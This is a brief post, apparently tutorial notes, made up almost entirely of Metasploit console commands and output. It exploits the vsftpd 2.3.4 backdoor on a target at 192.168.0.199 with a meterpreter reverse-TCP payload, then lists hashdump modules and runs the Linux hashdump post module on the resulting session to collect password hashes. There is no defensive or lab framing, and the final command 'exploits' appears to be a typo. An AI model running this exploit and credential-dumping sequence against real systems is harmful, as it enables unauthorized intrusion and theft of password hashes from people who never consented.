## Post

```bash
# =======================================================================================
# Step 1
msfconsole

# =======================================================================================
# Step 2
msf > search vsftpd
# Matching Modules
# ================
#    #  Name                                  Disclosure Date  Rank       Check  Description
#    -  ----                                  ---------------  ----       -----  -----------
#    0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
#    1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution

# =======================================================================================
# Step 3
msf > use exploit/unix/ftp/vsftpd_234_backdoor
# [*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp

# =======================================================================================
# Step 4
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options
# Module options ...................
# Payload options ...................
# Exploit target: ...................

# =======================================================================================
# Step 5
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.0.199 # NOTE: Target HOST

# =======================================================================================
# Step 6
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit # NOTE: Start

# =======================================================================================
# Step 7
# NOTE: If success you can continue with
background

# =======================================================================================
# Step 8
msf > show post
msf > search hashdump

# Matching Modules
# ================
#
#    #   Name                                                  Disclosure Date  Rank    Check  Description
#    -   ----                                                  ---------------  ----    -----  -----------
#    0   post/aix/hashdump                                     .                normal  No     AIX Gather Dump Password Hashes
#    1   post/android/gather/hashdump                          .                normal  No     Android Gather Dump Password Hashes for Android Systems
#    2   post/bsd/gather/hashdump                              .                normal  No     BSD Dump Password Hashes
#    3   auxiliary/scanner/smb/impacket/secretsdump            .                normal  No     DCOM Exec
#    4   post/linux/gather/hashdump                            .                normal  No     Linux Gather Dump Password Hashes for Linux Systems
#    5   auxiliary/scanner/mssql/mssql_hashdump                .                normal  No     MSSQL Password Hashdump
#    6   auxiliary/scanner/mysql/mysql_hashdump                .                normal  No     MYSQL Password Hashdump
#    7   post/windows/gather/credentials/mcafee_vse_hashdump   .                normal  No     McAfee Virus Scan Enterprise Password Hashes Dump
#    8   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal  No     MySQL Authentication Bypass Password Dump
#    9   post/osx/gather/hashdump                              .                normal  No     OS X Gather Mac OS X Password Hash Collector
#    10  auxiliary/scanner/oracle/oracle_hashdump              .                normal  No     Oracle Password Hashdump
#    11  auxiliary/analyze/crack_databases                     .                normal  No     Password Cracker: Databases
#    12    \_ action: auto                                     .                .       .      Auto-selection of cracker
#    13    \_ action: hashcat                                  .                .       .      Use Hashcat
#    14    \_ action: john                                     .                .       .      Use John the Ripper
#    15  auxiliary/scanner/postgres/postgres_hashdump          .                normal  No     Postgres Password Hashdump
#    16  post/solaris/gather/hashdump                          .                normal  No     Solaris Gather Dump Password Hashes for Solaris Systems
#    17  post/windows/gather/credentials/domain_hashdump       .                normal  No     Windows Domain Controller Hashdump
#    18  post/windows/gather/credentials/mssql_local_hashdump  .                normal  No     Windows Gather Local SQL Server Hash Dump
#    19  post/windows/gather/hashdump                          .                normal  No     Windows Gather Local User Account Password Hashes (Registry)
#    20  post/windows/gather/smart_hashdump                    .                normal  No     Windows Gather Local and Domain Controller Account Password Hashes

# =======================================================================================
# Step 9
msf > use post/linux/gather/hashdump
# msf post(linux/gather/hashdump) >


# =======================================================================================
# Step 10
msf post(linux/gather/hashdump) > show options
# Module options (post/linux/gather/hashdump):
#    Name     Current Setting  Required  Description
#    ----     ---------------  --------  -----------
#    SESSION  -1               yes       The session to run this module on

# =======================================================================================
# Step 11
# NOTE: You have to know what is the session you want 1 or 2 or ....
msf post(linux/gather/hashdump) > set SESSION 1
# SESSION => 1

# =======================================================================================
# Step 12
msf post(linux/gather/hashdump) > exploits # NOTE: Start
```
